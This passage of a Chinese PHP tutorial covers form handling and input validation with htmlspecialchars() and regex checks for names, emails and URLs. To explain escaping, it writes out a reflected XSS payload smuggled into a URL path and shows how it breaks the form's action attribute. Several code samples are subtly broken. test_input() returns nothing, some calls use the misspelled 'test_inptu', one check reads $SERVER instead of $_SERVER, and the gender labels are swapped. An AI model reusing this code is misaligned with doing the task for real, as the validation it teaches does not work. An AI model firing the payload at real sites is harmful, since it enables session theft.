punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        提交：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p><code>$_SERVER["PHP_SELF"]</code> 是一种超全局变量，它返回当前执行脚本的文件名。</p><p>因此，<code>$_SERVER["PHP_SELF"]</code> 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。</p><p><code>htmlspecialchars()</code> 函数把特殊字符转换为 <code>HTML</code> 实体。这意味着 <code>&lt;</code> 和 <code>&gt;</code> 之类的 <code>HTML</code> 字符会被替换为 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 。这样可防止攻击者通过在表单中注入 <code>HTML </code>或 <code>JavaScript</code> 代码（跨站点脚本攻击）对代码进行利用。</p><pre class=" language-php"><code class="language-php"><span class="token markup">&lt;form method="POST" action="<span class="token prolog">&lt;?php echo $_SERVER["PHP_SELF"];?></span></span>"<span class="token operator">></span></code></pre><p>假设我们的 <code>index.php</code> 中有如下表单，当输入正常网址 <code>http://www.xxx.com/index.php</code> 时，上面的代码就会转换为如下：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre><p>但是当恶意用户输入这样的 <code>http://www.xxx.com/index.php/"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code> 网址时</p><p>上面的代码就会变成</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>此时页面就会出现一个 <code>XSS</code> 弹窗，从而获取用户的登录信息。</p><p>怎样避免这种情况的发生呢？使用 <code>htmlspecialchars()</code> 函数可以将特殊字符进行转义，从而使代码无法正常被执行。此时上面的代码就会变成如下：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)&amp;lt;/script&amp;gt;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre><p>接下来写一个完整的实例：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 自定义白能量并设置为空值</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$url</span> <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'gender'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 首尾去空</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">stripcslashes</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 删除由 addcslashes() 函数添加的反斜杠。</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 对特殊字符进行转义</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h4 id="3-PHP-表单必填"><a href="#3-PHP-表单必填" class="headerlink" title="3. PHP 表单必填"></a>3. PHP 表单必填</h4><p>PHP 输入字段</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 定义变量并设置为空值</span><span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token variable">$urlErr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string">"姓名不能为空"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string">"邮箱不能为空"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$urlErr</span> <span class="token operator">=</span> <span class="token string">"网址不能为空"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">test_inptu</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token string">"性别不能为空"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token function">test_inptu</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$commentErr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token function">test_inptu</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>PHP 显示错误信息</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">PHP</span> 表单<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup">&lt;form method="POST" action="<span class="token prolog">&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);?></span></span>"<span class="token operator">></span>        姓名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">*</span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$nameErr</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>        邮箱：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">*</span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$emailErr</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>        网址：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$urlErr</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>        性别：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>男             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>女<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">*</span> <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$genderErr</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>        评论：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>        提交：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><h4 id="4-PHP-验证URL-x2F-email"><a href="#4-PHP-验证URL-x2F-email" class="headerlink" title="4. PHP 验证URL/email"></a>4. PHP 验证URL/email</h4><p>PHP 验证名字</p><pre class=" language-php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z ]*$/"</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string">"只允许字母和空格！"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><blockquote><p>注释：preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。</p></blockquote><p>PHP 验证 email</p><pre class=" language-php"><code class="language-php"><span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string">"无效的 email 格式！"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>PHP 验证 URL</p><pre class=" language-php"><code class="language-php"><span class="token variable">$website</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"website"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span>"<span class="token operator">/</span>\<span class="token package">b</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">:</span>https<span class="token operator">?</span><span class="token operator">|</span>ftp<span class="token punctuation">)</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">|</span>www\<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>z0<span class="token number">-9</span><span class="token operator">+</span><span class="token operator">&amp;</span>@<span class="token shell-comment comment">#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%</span><span class="token operator">=</span><span class="token operator">~</span>_<span class="token operator">|</span><span class="token punctuation">]</span><span class="token operator">/</span>i"<span class="token punctuation">,</span><span class="token variable">$website</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$websiteErr</span> <span class="token operator">=</span> <span class="token string">"无效的 URL"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>现在写一个完整的验证 名字、email 和 URL 的代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 定义变量并设置为空值</span><span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token variable">$urlErr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string">"名字不能为空"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 检查名字是否包含字母和空格</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z ]*$/"</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string">"只允许字母和空格"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string">"邮箱不能为空"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 检查电邮地址语法是否有效</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string">"邮箱格式无效"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线）</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span>"<span class="token operator">/</span>\<span class="token package">b</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">:</span>https<span class="token operator">?</span><span class="token operator">|</span>ftp<span class="token punctuation">)</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span><span class="token operator">|</span>www\<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token operator">-</span>z0<span class="token number">-9</span><span class="token operator">+</span><span class="token operator">&amp;</span>@<span class="token shell-comment comment">#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%</span>    <span class="token operator">=</span><span class="token operator">~</span>_<span class="token operator">|</span><span class="token punctuation">]</span><span class="token operator">/</span>i"<span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$urlErr</span> <span class="token operator">=</span> <span class="token string">"无效的网址"</span><span 